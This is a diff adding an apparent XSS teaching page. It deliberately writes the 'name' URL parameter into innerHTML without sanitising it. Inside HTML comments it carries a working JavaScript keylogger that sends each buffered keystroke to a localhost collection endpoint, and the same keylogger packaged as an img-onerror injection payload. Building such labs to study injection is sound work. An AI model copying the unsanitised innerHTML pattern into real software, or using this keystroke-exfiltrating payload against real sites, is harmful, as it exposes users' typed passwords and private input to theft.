@@ -1,0 +1,60 @@
+<html>
+    <body>
+        <div>
+            <!-- Vulnerable code -->
+            Welcome, <span id="username"></span>
+        </div>
+        <script>
+            function setCookie(name, value, days) {
+                const date = new Date();
+                date.setTime(date.getTime() + (days*24*60*60) );
+                const expires = "expires="+date.toUTCString();
+                document.cookie = name + "=" + value + ";" + expires; 
+                console.log(document.cookie)
+            }
+            setCookie("exampleCookie", "Hello cookie", 4);
+
+            const params = new URLSearchParams(window.location.search)
+            const name = params.get('name')
+            document.getElementById('username').innerHTML = name;
+        </script>
+    </body>
+</html>
+
+<!--  
+     var timeout;
+            var buffer = "";
+            document.querySelector('body').addEventListener('keypress', (event)=> {
+                if(!event.which !==0) {
+                    clearTimeout(timeout);
+                    buffer += String.fromCharCode(event.which);
+                    console.log('buffer'+buffer);
+                    timeout = setTimeout(()=>{
+                        var xhr = new XMLHttpRequest()
+                        var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer) 
+                        xhr.open('GET', uri);
+                        xhr.send();
+                        buffer = '';
+                    }, 400)
+                }
+            })
+-->
+
+<!--encodeURIComponent(`<img src="does-not-exists" onerror=" var timeout;
+            var buffer = "";
+            document.querySelector('body').addEventListener('keypress', (event)=> {
+                if(!event.which !==0) {
+                    clearTimeout(timeout);
+                    buffer += String.fromCharCode(event.which);
+                    timeout = setTimeout(()=>{
+                        var xhr = new XMLHttpRequest()
+                        var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer) 
+                        xhr.open('GET', uri);
+                        xhr.send();
+                        buffer = '';
+                    }, 400)
+                }
+            })">`)-->
+
+<!--  user keystroke is captured and http request is made -->
+
